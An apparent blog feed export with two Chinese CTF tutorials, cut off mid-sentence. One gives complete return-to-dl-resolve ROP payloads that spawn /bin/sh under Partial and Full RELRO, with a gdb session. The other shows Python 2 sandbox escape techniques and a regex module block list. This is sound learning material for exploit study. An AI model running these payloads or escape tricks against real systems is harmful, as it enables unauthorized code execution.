ElfW(Half) *vernum =            (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);          ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;          version = &amp;l-&gt;l_versions[ndx];          if (version-&gt;hash == 0)            version = NULL;        }</code></pre><p>32 位下可以构造如下 payload：</p><pre><code class="python">payload = (    ((        &#39;A&#39; * 18 + # padding        p32(buf + 1024 + 4) # set esp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        p32(plt0) +        p32(buf + 2048 - relplt) + # set reloc_arg=buf+2048        p32(0xdeadbeef) +        p32(buf + 2048 + 36)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048    # Elf32_Rel    p32(buf) + # r_offset    p32(0x7 | (((buf + 2048 + 8 + 4 - dynsym) / 16) &lt;&lt; 8)) + # r_info    p32(0) + # padding    # Elf32_Sym &lt;= buf+2048+12    p32(buf + 2048 + 28 - dynstr) + # st_name    p32(0) + # st_value    p32(0) + # st_size    p32(0x12) + # st_info    # buf+2048+28    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><p>64 位有一些地方不太一样，比如说结构体的大小等，其中 <code>reloc_arg</code> 的宏定义也和 32 位不同，上文也提到了。不过 <code>Elf64_Sym</code> 结构体的大小还是跟 32 位下的 <code>Elf32_Sym</code> 一样，只是几个变量的顺序有所改变，需要修改。同时，64 位下会产生上面提到的 Segmentation Fault。由于 64 位的 Function Call 用的是 <code>__libc_csu_init</code> 中的通用 Gadget，设置第一个参数 rdi 时只能传低 32 位，所以导致不能直接 <code>memcpy</code> 到 <code>link_map</code> 上来改 <code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code>，所以借助了 <code>read</code> 和 <code>write</code> 来实现：</p><pre><code class="python">reloc_arg = (buf + 2048 + 16 - relplt) / 24payload = (    ((        &#39;A&#39; * 14 + # padding        p64(buf + 1024 - 8) + # set rbp=buf+1024-8        p64(leave_ret) # stack pivot ; set rsp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(buf + 1024 + 160, got1, 8) + # buf+1024+120        write(1, 0, 0x1c8+8) + # buf+1024+240        memcpy(buf + 1024 + 400, got1, 8) + # buf+1024+360        read(0, 0, 0x1c8+8) + # buf+1024+480 ; l-&gt;l_info[VERSYMIDX (DT_VERSYM)]=NULL        p64(pop_rdi_ret) +        p64(buf + 2048 + 56) +        p64(plt0) +        p64(reloc_arg) # set reloc_arg    ).ljust(2048, &#39;\x00&#39;) +  # buf+2048    16 * &#39;\x00&#39; + # padding    # Elf64_Rela    p64(buf) + # r_offset    p64(0x7 | (((buf + 2048 + 32 - dynsym) / 24) &lt;&lt; 32)) + # r_info    # Elf64_Sym &lt;= buf+2048+32    p32(buf + 2048 + 48 - dynstr) + # st_name    p32(0x12) + # st_info    p32(0) +    p32(0) +    # buf+2048+48    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><p>Partial RELRO 的第二种方法是直接修改 <code>link_map</code>，将 <code>l_info[DT_STRTAB]</code> 指向构造出来的 <code>Elf32_Dyn</code>（<code>Elf64_Dyn</code>）来伪造 <code>.dynstr</code>。然后呼叫 <code>__gmon_start__</code> 并在对应 <code>st_name</code> 的地址处放上 <code>&quot;system\x00&quot;</code>。不过需要有特定的 Gadget 才有办法在不能泄漏的情况下使 <code>*(*(pointer)+offset)=value</code>。32 位下构造如下 payload：</p><pre><code class="python">def memcpy(dst, src, length):    return p32(memcpy_plt) + p32(pop3_ret) + p32(dst) + p32(src) + p32(length)payload = (    ((        &#39;A&#39; * 18 + # padding        p32(buf + 1024 + 4) # set esp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(buf + 1024 + 32, got1, 4) + # buf+1024+20        memcpy(buf, 0, 56) + # buf+1024+40        memcpy(buf + 52, buf + 2048, 4) + # buf+1024+60        memcpy(buf + 1024 + 88, got1, 4) + # buf+1024+80        memcpy(0, buf, 56) + # buf+1024+100        p32(gmon_start_plt) + p32(0xdeadbeef) + p32(buf + 2048 + 20)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048    p32(buf + 2048 + 4) +    p32(5) +    p32(buf + 2048 + 12 - st_name) +    # buf+2048+12    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><p>64 位下对 <code>link_map</code> 的修改同样借助了泄漏来实现：</p><pre><code class="python">payload = (    ((        &#39;A&#39; * 14 + # padding        p64(buf + 1024 - 8) + # set rbp=buf+1024-8        p64(leave_ret) # stack pivot ; set rsp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(buf + 1024 + 160, got1, 8) + # buf+1024+120        memcpy(buf, 0, 112) + # buf+1024+240        memcpy(buf + 104, buf + 2048, 8) + # buf+1024+360        write(1, buf, 112) + # buf+1024+480        memcpy(buf + 1024 + 640, got1, 8) + # buf+1024+600        read(0, 0, 112) + # buf+1024+720        p64(pop_rdi_ret) +        p64(buf + 2048 + 32) +        p64(gmon_start_plt)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048    p64(buf + 2048 + 8) +    p64(5) +    p64(buf + 2048 + 24 - st_name) +    # data+24    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><h2 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h2><p>GOT1 和 GOT2 在 Full RELRO 时被置为了 0，所以重点在于如何找回 <code>link_map</code> 和 Dynamic Resolver：</p><ul><li>找回 <code>link_map</code>：<code>.dynamic</code> 中 <code>DT_BUG</code> 指向 <code>r_debug</code> 结构，<code>r_debug</code> 中 <code>r_map</code> 指向 <code>link_map</code>；</li><li>找回 Dynamic Resolver：用 <code>l_next</code> 找下一个 Library，然后用 <code>l_info[DT_PLTGOT]</code> 找出 Library 的 <code>.got.plt</code> 地址（因为大部分 Library 都不是 Full RELRO，它们对应的 GOT2 就是 <code>_dl_runtime_resolve</code>）。</li></ul><p>以 32 位的程序为例，下面是 <code>link_map</code> 和 <code>_dl_runtime_resolve</code> 的查找过程：</p><pre><code class="gdb">(gdb) p/x *(Elf32_Dyn *)(0x08049ee8+12*8)$1 = {  d_tag = 0x15,  d_un = {    d_val = 0xf7ffd928,    d_ptr = 0xf7ffd928  }}(gdb) p/x *(struct r_debug *)0xf7ffd928$2 = {  r_version = 0x1,  r_map = 0xf7ffd940,  r_brk = 0xf7febae8,  r_state = 0x0,  r_ldbase = 0xf7fdd000}(gdb) p/x *(struct link_map *)0xf7ffd940$3 = {  l_addr = 0x0,  l_name = 0xf7ffdc2c,  l_ld = 0x8049ee8,  l_next = 0xf7ffdc30,  l_prev = 0x0,  l_real = 0xf7ffd940,  l_ns = 0x0,  l_libname = 0xf7ffdc20,  l_info = {0x0, 0x8049ee8, 0x8049f58, 0x8049f50, 0x0, 0x8049f28, 0x8049f30, 0x0, 0x0, 0x0, 0x8049f38, 0x8049f40, 0x8049ef0, 0x8049ef8, 0x0, 0x0, 0x0,    0x8049f70, 0x8049f78, 0x8049f80, 0x8049f60, 0x8049f48, 0x0, 0x8049f68, 0x8049f90, 0x8049f00, 0x8049f10, 0x8049f08, 0x8049f18, 0x0, 0x0, 0x0, 0x0, 0x0,    0x8049fa0, 0x8049f98, 0x0, 0x0, 0x8049f90, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8049fa8, 0x0 &lt;repeats 25 times&gt;, 0x8049f20},  l_phdr = 0x8048034,  l_entry = 0x8048350,  l_phnum = 0x9,  l_ldnum = 0x0,  ...(gdb) p/x ((struct link_map *)0xf7ffd940)-&gt;l_next-&gt;l_info[3]$4 = 0x0(gdb) p/x ((struct link_map *)0xf7ffd940)-&gt;l_next-&gt;l_next-&gt;l_info[3]$5 = 0xf7fd2de0(gdb) p/x *(Elf32_Dyn *)0xf7fd2de0$6 = {  d_tag = 0x3,  d_un = {    d_val = 0xf7fd3000,    d_ptr = 0xf7fd3000  }}(gdb) x/3wx 0xf7fd30000xf7fd3000:    0x0019bd88    0xf7fd7770    0xf7ff04e0(gdb) x/i 0xf7ff04e0   0xf7ff04e0 &lt;_dl_runtime_resolve&gt;:    push   eax</code></pre><p>32 位下的构造如下：</p><pre><code class="python">payload = (    ((        &#39;A&#39; * 18 + # padding        p32(buf + 1024 + 4) # set esp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(buf + 1024 + 32, r_debug_addr, 4) + # buf+1024+20        memcpy(buf, 0, 8) + # buf+1024+40 ; link_map=buf+4        memcpy(buf + 1024 + 72, link_map_addr, 4) + # buf+1024+60        memcpy(buf + 8, 0, 16) + # buf+1024+80 ; link_map-&gt;l_next=buf+20        memcpy(buf + 1024 + 112, buf + 20, 4) + # buf+1024+100        memcpy(buf + 8, 0, 16) + # buf+1024+120 ; link_map-&gt;l_next-&gt;l_next=buf+20        memcpy(buf + 1024 + 152, buf + 20, 4) + # buf+1024+140        memcpy(buf + 8, 0, 48) + # buf+1024+160 ; link_map-&gt;l_next-&gt;l_next-&gt;l_info[DT_PLTGOT]=buf+52        memcpy(buf + 1024 + 192, buf + 52, 4) + # buf+1024+180        memcpy(buf + 8, 0, 8) + # buf+1024+200 ; .got.plt=buf+12        memcpy(buf + 1024 + 232, buf + 12, 4) + # buf+1024+220        memcpy(buf + 8, 0, 12) + # buf+1024+240 ; _dl_runtime_resolve=buf+16        memcpy(buf + 1024 + 280, dl_runtime_resolve_addr, 4) + # buf+1024+260        memcpy(buf + 1024 + 284, link_map_addr, 4) + # buf+1024+280        p32(0) + # _dl_runtime_resolve        p32(0) + # link_map        p32(reloc_arg) + # reloc_arg        p32(0xdeadbeef) +        p32(buf + 2048 + 36)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048        # Elf32_Rel        p32(buf) + # r_offset        p32(0x7 | (((buf + 2048 + 8 + 4 - dynsym) / 16) &lt;&lt; 8)) + # r_info        p32(0) + # padding        # Elf32_Sym &lt;= buf+2048+12        p32(buf + 2048 + 28 - dynstr) + # st_name        p32(0) + # st_value        p32(0) + # st_size        p32(0x12) + # st_info        # buf+2048+28        &#39;system\x00\x00&#39; +        &#39;/bin/sh\x00&#39;)</code></pre><p>64 位下会需要更长的输入才能完成一系列的构造：</p><pre><code class="python">payload = (    ((        &#39;A&#39; * 14 + # padding        p64(buf + 1024 - 8) + # set rbp=buf+1024-8        p64(leave_ret) # stack pivot ; set rsp=buf+1024    ).ljust(1024, &#39;\x00&#39;) +        memcpy(buf + 1024 + 160, r_debug_addr, 8) + # buf+1024+120        memcpy(buf, 0, 16) + # buf+1024+240 ; link_map_addr=buf+8        memcpy(buf + 1024 + 400, link_map_addr, 8) + # buf+1024+360        memcpy(buf + 16, 0, 32) + # buf+1024+480 ; l-&gt;l_next=buf+40        memcpy(buf + 1024 + 640, buf + 40, 8) + # buf+1024+600        memcpy(buf + 16, 0, 32) + # buf+1024+720 ; l-&gt;l_next-&gt;l_next=buf+40        memcpy(buf + 1024 + 880, buf + 40, 8) + # buf+1024+840        memcpy(buf + 16, 0, 96) + # buf+1024+960 ; l-&gt;l_next-&gt;l_next-&gt;l_info[DT_PLTGOT]=buf+104        memcpy(buf + 1024 + 1120, buf + 104, 8) + # buf+1024+1080        memcpy(buf + 16, 0, 16) + # buf+1024+1200 ; .got.plt=buf+24        memcpy(buf + 1024 + 1360, buf + 24, 8) + # buf+1024+1320        memcpy(buf + 16, 0, 24) + # buf+1024+1440 ; _dl_runtime+resolve=buf+32        memcpy(buf + 1024 + 1600, link_map_addr, 8) + # buf+1024+1560        write(1, 0, 0x1c8+8) + # buf+1024+1680        memcpy(buf + 1024 + 1840, link_map_addr, 8) + # buf+1024+1800        read(0, 0, 0x1c8+8) + # buf+1024+1920        memcpy(buf + 1024 + 2176, dl_runtime_resolve_addr, 8) + # buf+1024+2040        memcpy(buf + 1024 + 2184, link_map_addr, 8) + # buf+1024+2160        p64(pop_rdi_ret) +        p64(buf + 4096 + 40) +        p64(0) + # _dl_runtime_resolve        p64(0) + # link_map        p64(reloc_arg) # reloc_arg    ).ljust(4096, &#39;\x00&#39;) + # buf+4096        # Elf64_Rela        p64(buf) + # r_offset        p64(0x7 | (((buf + 4096 + 16 - dynsym) / 24) &lt;&lt; 32)) + # r_info        # Elf64_Sym &lt;= buf+4096+16        p32(buf + 4096 + 32 - dynstr) + # st_name        p32(0x12) + # st_info        p32(0) +        p32(0) +        # buf+4096+32        &#39;system\x00\x00&#39; +        &#39;/bin/sh\x00&#39;)</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=wsIvqd9YqTI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wsIvqd9YqTI</a><br><a href="https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf" target="_blank" rel="noopener">https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf</a><br><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933</a><br><a href="http://www.inforsec.org/wp/?p=389" target="_blank" rel="noopener">http://www.inforsec.org/wp/?p=389</a><br><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a><br><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br><a href="http://phrack.org/issues/58/4.html" target="_blank" rel="noopener">http://phrack.org/issues/58/4.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;重看 Winesap 的视频收获颇多，重新把 return-to-dl-resolve 整理了一下。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>初探Python沙箱逃逸</title>
    <link href="blog.b3ale.cn/2020/04/02/%E5%88%9D%E6%8E%A2Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <id>blog.b3ale.cn/2020/04/02/%E5%88%9D%E6%8E%A2Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</id>
    <published>2020-04-02T11:03:42.000Z</published>
    <updated>2020-04-03T03:41:06.880Z</updated>
    
    <content type="html"><![CDATA[<p>接触过的 Python 沙箱逃逸不是很多，参考了很多大佬的博客。本文主要基于 Python2。</p><a id="more"></a><blockquote><p>沙箱逃逸，就是在给我们的一个代码执行环境下，脱离种种过滤和限制，最终拿到 shell。</p></blockquote><p>对于 Python2 的沙箱逃逸而言，实现目的的最终想法有以下几个：</p><ul><li>使用 <code>os</code> 包中的 <code>popen</code>、<code>system</code> 两个函数</li><li>使用 <code>commands</code> 模块中的方法</li><li>使用 <code>subprocess</code> 模块中的方法</li><li>使用写文件到指定位置，再使用其他辅助手段</li></ul><p>总体来说，就是使用以下几个函数来执行命令：</p><pre><code class="python">import osimport subprocessimport commandsos.system(&#39;ifconfig&#39;)os.popen(&#39;ifconfig&#39;)commands.getoutput(&#39;ifconfig&#39;)commands.getstatusoutput(&#39;ifconfig&#39;)subprocess.call([&#39;ifconfig&#39;], shell=True)</code></pre><p>下面记录针对不同情况采取的绕过方法。</p><blockquote><p>PS：获取当前的 Python 环境</p><pre><code class="python">import sysprint sys.version</code></pre></blockquote><h1 id="一些有用的模块和函数"><a href="#一些有用的模块和函数" class="headerlink" title="一些有用的模块和函数"></a>一些有用的模块和函数</h1><p>除了上面提到的几个模块，还有几种可以曲线救国。</p><h2 id="timeit-模块"><a href="#timeit-模块" class="headerlink" title="timeit 模块"></a><code>timeit</code> 模块</h2><p>用于测试小代码片段的运行时间（<code>number</code> 即表示测试的次数）：</p><pre><code class="python">import timeittimeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;pwd&#39;)&quot;, number=1)</code></pre><h2 id="platform-模块"><a href="#platform-模块" class="headerlink" title="platform 模块"></a><code>platform</code> 模块</h2><p>类似 <code>os</code> 模块的 <code>popen</code>，可以执行命令：</p><pre><code class="python">import platformplatform.popen(&#39;pwd&#39;).read()</code></pre><h2 id="codecs-模块"><a href="#codecs-模块" class="headerlink" title="codecs 模块"></a><code>codecs</code> 模块</h2><p>可以用来读文件：</p><pre><code class="python">import codecscodecs.open(&#39;code.py&#39;).read()</code></pre><h2 id="exec-、eval-、execfile-、compile-函数"><a href="#exec-、eval-、execfile-、compile-函数" class="headerlink" title="exec()、eval()、execfile()、compile() 函数"></a><code>exec()</code>、<code>eval()</code>、<code>execfile()</code>、<code>compile()</code> 函数</h2><ul><li><code>exec()</code>：动态运行代码段，返回值为 <code>None</code></li><li><code>eval()</code>：计算单个表达式的值，有返回值</li><li><code>execfile()</code>：动态运行某个文件中的代码</li><li><code>compile()</code>：将一个字符串编译为字节代码</li></ul><pre><code class="python">In [1]: o = compile(&#39;a = 1 + 1&#39;, &#39;&lt;string&gt;&#39;, &#39;exec&#39;)In [2]: exec(o)In [3]: print a2</code></pre><h1 id="字符串过滤的绕过"><a href="#字符串过滤的绕过" class="headerlink" title="字符串过滤的绕过"></a>字符串过滤的绕过</h1><p>如果是某个字符串被过滤了，可以对它进行一些变换：</p><pre><code class="python">In [1]: d = {&#39;key&#39;: 1}In [2]: print d[&#39;yek&#39;[::-1]]1</code></pre><p>如果是关键字被过滤了，可以使用 <code>getattr</code>。<code>getattr</code> 接收两个参数，第一个是模块或对象，第二个是一个字符串。它会在模块或对象中搜索指定的函数或属性：</p><pre><code class="python">In [1]: import osIn [2]: getattr(os, &#39;676574637764&#39;.decode(&#39;hex&#39;))()Out[2]: &#39;/usr/lib/python2.7&#39;</code></pre><h1 id="import-花式处理"><a href="#import-花式处理" class="headerlink" title="import 花式处理"></a><code>import</code> 花式处理</h1><p><code>import</code> 关键字用来导入包，沙箱中对一些包或是函数进行了屏蔽，从 <code>import</code> 的不同方法到 <code>import</code> 的本质有多种不同的绕过方法。</p><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><p>防御最基础的思路就是正则匹配代码中的内容，检测是否调用了 <code>import</code>：</p><pre><code class="python">In [1]: import re   ...: code = &#39;import os&#39;   ...: pat = re.compile(&#39;import\s+(os|commands|subprocess|sys)&#39;)   ...: if pat.search(code) != None:   ...:     raise Exception, &#39;Detected forbidden module.&#39;   ...:---------------------------------------------------------------------------Exception                                 Traceback (most recent call last)&lt;ipython-input-1-db50a328bbb7&gt; in &lt;module&gt;()      3 pat = re.compile(&#39;import\s+(os|commands|subprocess|sys)&#39;)      4 if pat.search(code) != None:----&gt; 5     raise Exception, &#39;Detected forbidden module.&#39;Exception: Detected forbidden module.</code></pre><p>绕过的方式也很简单，使用其他的方式来导入其他包名：</p><ul><li><code>import</code> 关键字</li><li><code>__import__</code> 函数</li><li><code>importlib</code> 库</li></ul><pre><code class="python">__import__(&#39;Y29tbWFuZHM=&#39;.decode(&#39;base64&#39;)).getoutput(&#39;pwd&#39;)import importlibx = importlib.import_module(&#39;pbzznaqf&#39;.decode(&#39;rot_13&#39;))print x.getoutput(&#39;pwd&#39;)</code></pre><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>在 Python2 中不用直接使用的内置函数被称为 builtin 函数，跟随 <code>__builtin__</code> 模块自动被加载。例如 <code>open()</code>、<code>int()</code>、<code>chr()</code> 这些函数相当于如下形式：</p><pre><code class="python">__builtin__.open()__builtin__.int()__builtin__.chr()</code></pre><p>防御的一种方法就是用 <code>del</code> 把这些函数删除：</p><pre><code class="python">In [1]: del __builtin__.chrIn [2]: chr(1)---------------------------------------------------------------------------NameError                                 Traceback (most recent call last)&lt;ipython-input-2-288f58b79c7d&gt; in &lt;module&gt;()----&gt; 1 chr(1)NameError: name &#39;chr&#39; is not defined</code></pre><p>绕过的方法是使用 <code>reload</code> 来重新加载 <code>__builtin__</code> 模块：</p><pre><code class="python">In [1]: reload(__builtin__)Out[1]: &lt;module &#39;__builtin__&#39; (built-in)&gt;In [2]: chr(1)Out[2]: &#39;\x01&#39;</code></pre><p>同时 <code>reload</code> 也是 <code>__builtin__</code> 下的一个函数，如果删除了它该怎么办？答案是使用 <code>imp</code> 模块，也可以对 <code>__builtin</code> 进行重新导入：</p><pre><code class="python">In [1]: import impIn [2]: imp.reload(__builtin__)Out[2]: &lt;module &#39;__builtin__&#39; (built-in)&gt;In [3]: chr(1)Out[3]: &#39;\x01&#39;</code></pre><h2 id="Advance"><a href="#Advance" class="headerlink" title="Advance"></a>Advance</h2><p>Python 中的所有包都是以 <code>.py</code> 文件的形式存在的，说明所有 <code>import</code> 进来的包一开始都预先在某个位置了。一般和系统相关的信息都在 <code>sys</code> 下，使用 <code>sys.path</code> 查看各个包的路径：</p><pre><code class="python">In [1]: import sysIn [2]: sys.pathOut[2]:[&#39;&#39;, &#39;/usr/local/bin&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python27.zip&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/plat-darwin&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/plat-mac&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/plat-mac/lib-scriptpackages&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-tk&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-old&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload&#39;, &#39;~/Library/Python/2.7/lib/python/site-packages&#39;, &#39;/usr/local/lib/python2.7/site-packages&#39;, &#39;/usr/local/lib/python2.7/site-packages/oletools-0.54.2-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/msoffcrypto_tool-4.10.1-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/colorclass-2.2.0-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/easygui-0.98.1-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/olefile-0.46-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/ida_netnode-1.1-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/wasm-1.2-py2.7.egg&#39;, &#39;~/Tools/python-uncompyle6&#39;, &#39;/usr/local/lib/python2.7/site-packages/PyMySQL-0.9.3-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/pysm4-0.7-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/gtk-2.0&#39;, &#39;/usr/local/lib/python2.7/site-packages/gtk-2.0&#39;, &#39;/usr/local/lib/python2.7/site-packages/IPython/extensions&#39;, &#39;~/.ipython&#39;]</code></pre><p><code>sys</code> 下还有一个 <code>modules</code>，返回一个字典，其中可以查看各个模块对应的系统路径。如果修改这个字典中的内容，前面使用的方法就都失效了：</p><pre><code class="python">In [1]: import sysIn [2]: sys.modules[&#39;os&#39;] = NoneIn [3]: import os---------------------------------------------------------------------------ImportError                               Traceback (most recent call last)&lt;ipython-input-9-543d7f3a58ae&gt; in &lt;module&gt;()----&gt; 1 import osImportError: No module named osIn [4]: __import__(&#39;os&#39;)---------------------------------------------------------------------------ImportError                               Traceback (most recent call last)&lt;ipython-input-10-1b9b14481c7e&gt; in &lt;module&gt;()----&gt; 1 __import__(&#39;os&#39;)ImportError: No module named osIn [5]: import importlibIn [6]: importlib.import_module(&#39;os&#39;)---------------------------------------------------------------------------ImportError                               Traceback (most recent call last)&lt;ipython-input-12-51afbccc7d3c&gt; in &lt;module&gt;()----&gt; 1 importlib.import_module(&#39;os&#39;)/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/importlib/__init__.pyc in import_module(name, package)     35             level += 1     36         name = _resolve_name(name[level:], package, level)---&gt; 37     __import__(name)     38     return sys.modules[name]ImportError: No module named os</code></pre><p>解决这种情况，就得尝试把对应的模块路径修复回来，一般默认的 <code>os</code> 模块是在 <code>/usr/bin/python2.7/os.py</code>：</p><pre><code class="python">In [1]: import sysIn [2]: sys.modules[&#39;os&#39;] = &#39;/usr/lib/python2.7/os.py&#39;In [3]: import os</code></pre><h2 id="Hell"><a href="#Hell" class="headerlink" title="Hell"></a>Hell</h2><p>如果把 <code>sys</code>、<code>os</code>、<code>reload</code> 等一系列模块都过滤掉了，使用什么方法来绕过呢？导入模块的过程其实就是把对应模块的代码执行一遍的过程，在知道模块对应路径的情况下，就可以相应地执行它：</p><pre><code class="python">In [1]: execfile(&#39;/usr/lib/python2.7/os.py&#39;)In [2]: system(&#39;pwd&#39;)/usr/lib/python2.7Out[2]: 0In [3]: getcwd()Out[3]: &#39;/usr/lib/python2.7&#39;</code></pre><p>在 <code>execfile</code> 被禁止的情况下，还可以用 <code>open</code> 读入文件，并使用 <code>exec</code> 来执行相应的代码：</p><pre><code class="python">In [1]: code = open(&#39;/usr/lib/python2.7/os.py&#39;, &#39;r&#39;).read()In [2]: exec codeIn [3]: getcwd()Out[3]: &#39;/usr/lib/python2.7&#39;</code></pre><h1 id="各类内联函数和属性的使用"><a href="#各类内联函数和属性的使用" class="headerlink" title="各类内联函数和属性的使用"></a>各类内联函数和属性的使用</h1><h2 id="dir-和-dict"><a href="#dir-和-dict" class="headerlink" title="dir 和 __dict__"></a><code>dir</code> 和 <code>__dict__</code></h2><p><code>dir</code> 和 <code>__dict__</code> 可以用来查看类或对象下的所有属性信息：</p><pre><code class="python">In [1]: class A():    ...:     def __init__(self):    ...:         self.a = &#39;a&#39;    ...:In [2]: dir(A)Out[2]: [&#39;__doc__&#39;, &#39;__init__&#39;, &#39;__module__&#39;]In [3]: A.__dict__Out[3]:{&#39;__doc__&#39;: None, &#39;__init__&#39;: &lt;function __main__.__init__&gt;, &#39;__module__&#39;: &#39;__main__&#39;}</code></pre><p>和 <code>sys.modules</code> 配合使用获得一个模块的引用：</p><pre><code class="python">In [1]: import sysIn [2]: dir(sys.modules[__name__])Out[2]:[&#39;In&#39;, &#39;Out&#39;, &#39;_&#39;, &#39;_11&#39;, &#39;_12&#39;, &#39;_13&#39;, &#39;_14&#39;, &#39;_15&#39;, &#39;_8&#39;, &#39;__&#39;, &#39;___&#39;, &#39;__builtin__&#39;, &#39;__builtins__&#39;, &#39;__doc__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;_dh&#39;, &#39;_i&#39;, &#39;_i1&#39;, &#39;_i10&#39;, &#39;_i11&#39;, &#39;_i12&#39;, &#39;_i13&#39;, &#39;_i14&#39;, &#39;_i15&#39;, &#39;_i16&#39;, &#39;_i17&#39;, &#39;_i2&#39;, &#39;_i3&#39;, &#39;_i4&#39;, &#39;_i5&#39;, &#39;_i6&#39;, &#39;_i7&#39;, &#39;_i8&#39;, &#39;_i9&#39;, &#39;_ih&#39;, &#39;_ii&#39;, &#39;_iii&#39;, &#39;_oh&#39;, &#39;_sh&#39;, &#39;d&#39;, &#39;exit&#39;, &#39;get_ipython&#39;, &#39;os&#39;, &#39;quit&#39;, &#39;s&#39;, &#39;sys&#39;]</code></pre><h2 id="func-code-的利用"><a href="#func-code-的利用" class="headerlink" title="func_code 的利用"></a><code>func_code</code> 的利用</h2><p>函数的 <code>func_code</code> 属性可以被用来查看函数的参数个数以及变量，还能看到函数对应的字节码：</p><pre><code class="python">In [1]: def f(x, y, z):    ...:     a = &#39;secret&#39;    ...:     b = 2333    ...:In [2]: f.func_code.co_argcountOut[2]: 3In [3]: f.func_code.co_constsOut[3]: (None, &#39;secret&#39;, 2333)In [4]: f.func_code.co_codeOut[4]: &#39;d\x01\x00}\x03\x00d\x02\x00}\x04\x00d\x00\x00S&#39;</code></pre><p>使用 <code>dis</code> 库可以获取函数对应汇编格式的字节码：</p><pre><code class="python">In [1]: import disIn [2]: dis.dis(f)  2           0 LOAD_CONST               1 (&#39;secret&#39;)              3 STORE_FAST               3 (a)  3           6 LOAD_CONST               2 (2333)              9 STORE_FAST               4 (b)             12 LOAD_CONST               0 (None)             15 RETURN_VALUE</code></pre><h2 id="mro-和-bases-属性"><a href="#mro-和-bases-属性" class="headerlink" title="__mro__ 和 __bases__ 属性"></a><code>__mro__</code> 和 <code>__bases__</code> 属性</h2><p>Python 允许多重继承，即一个子类有多个父类。<code>__mro__</code> 属性可以用来查看一个子类所有的父类；<code>__bases__</code> 可以获取上一层的继承关系：</p><pre><code class="python">In [1]: class A(object): passIn [2]: class B(object): passIn [3]: class C(A, B): passIn [4]: C.__bases__Out[4]: (__main__.A, __main__.B)In [5]: C.__mro__Out[5]: (__main__.C, __main__.A, __main__.B, object)In [6]: 1..__class__.__bases__Out[6]: (object,)In [7]: 1..__class__.__mro__Out[7]: (float, object)In [8]: &#39;&#39;.__class__.__bases__Out[8]: (basestring,)In [9]: &#39;&#39;.__class__.__mro__Out[9]: (str, basestring, object)</code></pre><p>比如在 <code>open</code> 等文件操作被限制的情况下可以用下面的方法读取文件内容（<code>__subclasses__</code> 即用来查看对象的所有子类；<code>Object</code> 的查询结果中第 40 个类为 